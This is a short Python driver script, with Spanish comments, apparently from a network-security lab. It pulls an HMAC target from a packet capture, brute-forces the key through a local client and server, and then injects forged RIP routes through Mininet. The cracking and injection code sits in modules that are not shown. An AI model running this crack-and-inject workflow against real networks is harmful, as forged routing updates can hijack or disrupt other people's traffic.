import subprocess
import sys

import reader
import server

PCAP_PATH = "capture.pcap"
CLIENT_PATH = "client.py"


def main():
  # Leer el archivo
  target_hmac, payload_hex = reader.get_crack_target(PCAP_PATH)

  # Levantar un cliente local en background para que le pegue al servidor
  client_process = subprocess.Popen([sys.executable, CLIENT_PATH])

  try:
    # Orquestar el servidor y los clientes
    found_key = server.start_server(target_hmac, payload_hex)
  finally:
    if client_process.poll() is None:
      client_process.terminate()
      client_process.wait()

  # Con la contraseña ejecutar la inyección de RIP
  if found_key:
    print(f"Key found: {found_key}")
    server.inject_via_mininet(found_key)
  else:
    print("No key found (keyspace exhausted or server interrupted).")

  return


if __name__ == '__main__':
  main()